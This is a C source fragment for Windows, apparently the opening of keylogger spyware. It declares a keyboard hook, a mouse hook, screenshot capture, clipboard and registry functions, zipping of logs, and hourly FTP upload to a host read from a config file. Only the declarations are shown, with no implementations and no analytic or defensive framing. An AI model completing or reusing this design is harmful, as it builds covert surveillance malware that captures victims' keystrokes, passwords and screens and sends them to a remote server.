#pragma comment(lib, "GDI32.lib") 
#pragma comment(lib, "user32.lib") 
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "ws2_32.lib")

#include <stdio.h>
#include <conio.h>
#include <winsock2.h>
#include "time.h"
#include "zip.h"

#define USER "USER"
#define PASS "PASS"
#define CWD  "CWD"
#define PWD  "PWD"
#define TYPE_I "TYPE I"
#define PASV "PASV"
#define STOR "STOR"
#define ACCEPT_DATA "150" //Accepted data connection
#define INTERVAL_TIME 3600
#define CMD_SIZE 256
#define STR_SIZE 512
#define STR_SIZE_MAX 1024
#define FILE_BUFF_SIZE 1420
#define N_FILES 50
#define LOG_FILE ".\\logs"
#define CONF_FILE ".\\config"


void init();
bool send_file();
void create_zip_file(char *path_zip_file, 
					 char screen_file[N_FILES][STR_SIZE], 
					 char *log_file);
void set_clipboard();
bool upload_file(	char *host,
					char *port,
					char *user_name,
					char *user_pass,
					char *ftp_dir,
					char *file_name,
					char *path_file );
void write_log(char *data);
void change_window();
char *recv_msg(SOCKET socket);
void send_cmd(char *cmd, SOCKET socket);
int get_data_port(char *str);
bool set_registry_key( HKEY hKey, 
					  char *keyPath, 
					  char *keyName, 
					  char *keyData );
void get_registry_key( HKEY hKey, 
					  char *keyPath, 
					  char *keyName, 
					  char * reg_key );
bool screen_shot(char *szFilename, 
				 int Top, 
				 int Left, 
				 int Width, 
				 int Height);
bool  save_bitmap(char *szFilename, HBITMAP hBitmap);
unsigned long _random();
void delete_socket(SOCKET s);
SOCKET create_sock( char * serverHost, short serverPort );
int CALLBACK keyoard_hook(int n_code, DWORD w_param, DWORD l_param);
void write_char_code(DWORD vk_code, bool shift, bool caps);
bool copy_file(char *src_file_path, char *dst_file_path);
LRESULT CALLBACK mouse_hook(int n_code, DWORD w_param, DWORD l_param);
bool read_config(	char *config,
					char *host,
					char *port,
					char *login,
					char *password );